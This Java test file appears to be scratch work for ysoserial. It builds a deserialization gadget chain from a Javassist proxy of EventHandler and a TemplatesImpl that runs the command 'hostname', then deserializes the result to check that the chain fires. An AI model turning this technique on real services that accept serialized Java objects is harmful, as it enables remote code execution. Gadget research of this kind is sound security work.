import java.beans.EventHandler;
import java.io.Serializable;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;

import javassist.util.proxy.ProxyFactory;

import javax.xml.transform.Templates;

import sun.misc.Unsafe;
import ysoserial.Deserializer;
import ysoserial.Serializer;
import ysoserial.payloads.util.Gadgets;


public class Tester {
	public static class Foo {
		public boolean value() {
			System.out.println("called");
			return true;
		}
	}

	public static void main(String[] args) throws Exception {

//		Transient t = Gadgets.createProxy((InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Transient.class, new HashMap()), Transient.class);
//
//		t.equals(new Foo());


		ProxyFactory pf2 = new ProxyFactory();
		ProxyFactory pf = new ProxyFactory();

		pf.setInterfaces(new Class[]{ Serializable.class });
		pf.setSuperclass(EventHandler.class);
		pf.setUseWriteReplace(true);
		pf.setUseCache(false);

		//     public EventHandler(Object target, String action, String eventPropertyName, String listenerMethodName) {


		Templates t = Gadgets.createTemplatesImplExec("hostname");

		Class c = pf.createClass();

		Constructor ctor = c.getConstructors()[0];
		ctor.setAccessible(true);

		Object o = ctor.newInstance(t, "getOutputProperties", null, null);


		//Object o = getUnsafe().allocateInstance(c);

		//Object o = c.newInstance();

//		System.out.println(pf);
//		System.out.println(pf.hashCode());
//		System.out.println(c);
		System.out.println(c.getName());
		System.out.println(o.getClass().getName());
//		System.out.println(o);
//		System.out.println(Arrays.asList(c.getInterfaces()));

		byte[] serialized = Serializer.serialize(o);
//
////		System.out.write(serialized);
//
		try {
			Object o2 = Deserializer.deserialize(serialized);
			//System.out.println(o2);
			System.out.println(o2.getClass());
			System.out.println(o2.getClass().getName());

			o2 = Deserializer.deserialize(serialized);
			System.out.println(o2.getClass());
			System.out.println(o2.getClass().getName());

			o2 = Deserializer.deserialize(serialized);
			System.out.println(o2.getClass());
			System.out.println(o2.getClass().getName());
		} catch (Exception e) {
			e.printStackTrace();
		}


		getUnsafe().allocateInstance(Class.class);

	}

	public static Unsafe getUnsafe() {
	    try {
	            Field f = Unsafe.class.getDeclaredField("theUnsafe");
	            f.setAccessible(true);
	            return (Unsafe)f.get(null);
	    } catch (Exception e) { throw new RuntimeException(e); }
	}
}
